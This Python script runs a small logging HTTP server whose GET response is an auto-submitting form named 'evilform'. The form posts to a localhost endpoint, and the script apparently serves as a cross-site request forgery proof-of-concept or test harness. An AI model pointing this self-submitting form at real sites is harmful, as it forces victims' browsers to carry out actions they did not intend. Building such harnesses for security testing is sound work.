from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import logging

logging.basicConfig(format='%(asctime)s Request:\n%(message)s', level=logging.DEBUG)


class pyhandler(BaseHTTPRequestHandler):
    def _render(self, content):
        site = '<html>{}</html>'.format(content)
        self.wfile.write(site.encode('utf-8'))

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        #self.send_header('Location', 'http://127.0.0.1/test')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        self._render("""
            <form id="evilform" action="http://127.0.0.1/post" method="post">
                <!--input name="test" value="evil" /-->
            </form>
            <script>
                document.forms["evilform"].submit();
            </script>
        </html>
        """)

    def do_POST(self):
        self._set_headers()

    def log_message(self, *args):
        try:
            if 'Content-Length' in self.headers:
                length = int(self.headers['Content-Length'])
                logging.info('{}\n{}\n{}'.format(self.requestline, self.headers, self.rfile.read(length)))
            else:
                logging.info('{}\n{}'.format(self.requestline, self.headers))
        except Exception as e:
            print('Exception:\n{}'.format(e))
            pass


class pyhttp(object):
    def __init__(self, server_class=HTTPServer, 
                 handler_class=pyhandler):
        self.address = server_address = ('', 8000)
        self.httpd = server_class(server_address, handler_class)
        self.httpd.serve_forever()


pyhttp()

